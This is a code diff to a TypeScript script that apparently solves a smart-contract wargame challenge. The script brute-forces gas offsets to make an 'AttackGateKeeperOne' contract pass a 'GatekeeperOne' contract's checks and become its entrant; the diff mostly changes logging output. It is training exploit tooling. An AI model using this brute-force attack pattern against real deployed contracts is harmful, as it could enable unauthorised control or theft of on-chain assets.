@@ -10,7 +10,7 @@ const delay = (ms: number) => new Promise(resolve => setTimeout(resolve, ms));
 
 const checkMissionStatus = async (gateKeeperOne: GatekeeperOne, deployerAddress: string) => {
   const isMissionAccomplished = await gateKeeperOne.entrant() === deployerAddress;
-  console.log(`Mission Accomplished: ${isMissionAccomplished}`);
+  console.log(`🎯 Mission Accomplished: ${isMissionAccomplished ? '✅ Yes!' : '❌ No!'}`);
 }
 
 const main = async (): Promise<void> => {
@@ -20,29 +20,30 @@ const main = async (): Promise<void> => {
   const attackGateKeeperOneDeployment: Deployment = await deployments.get("AttackGateKeeperOne");
   const attackGateKeeperOne: AttackGateKeeperOne = await ethers.getContractAt("AttackGateKeeperOne", attackGateKeeperOneDeployment.address);
 
-  checkMissionStatus(gateKeeperOne, await deployer.getAddress());
+  await checkMissionStatus(gateKeeperOne, await deployer.getAddress());
 
   ethers.utils.Logger.setLogLevel(ethers.utils.Logger.levels.OFF);
 
   for(let i = BigNumber.from("0"); i.lte(OFFSET_GAS); i = i.add(BigNumber.from("1"))) {
-    console.log(`Testing with offset gas: ${i}`);
+    process.stdout.write(`🛢️ Testing with offset gas: ${i.toString()}... `);
     
     try {
       await attackGateKeeperOne.callStatic.attack(GAS, i);
-      console.log(`Using offset gas: ${i}`);
-
+      process.stdout.write(`⛽ Using offset gas: ${i}\n`);
       let tx = await attackGateKeeperOne.attack(GAS, i,{ gasLimit: 250000});
       if ((await tx.wait()).status === 1) {
-        console.log(`Attack Gatekeeper operation successful`);
+        console.log(`🚀 Attack GatekeeperOne operation successful`);
         break;
       }
     } catch (error) {
-      console.log(`Gas Error with: ${i}`);
+      process.stdout.write(`⛔ Gas Error with: ${i}\r`);
     }
   }
 
   await delay(5000);
-  checkMissionStatus(gateKeeperOne, await deployer.getAddress());
+  await checkMissionStatus(gateKeeperOne, await deployer.getAddress());
 };
 
-main();
+main().catch(error => {
+  console.error('🚫', error);
+});
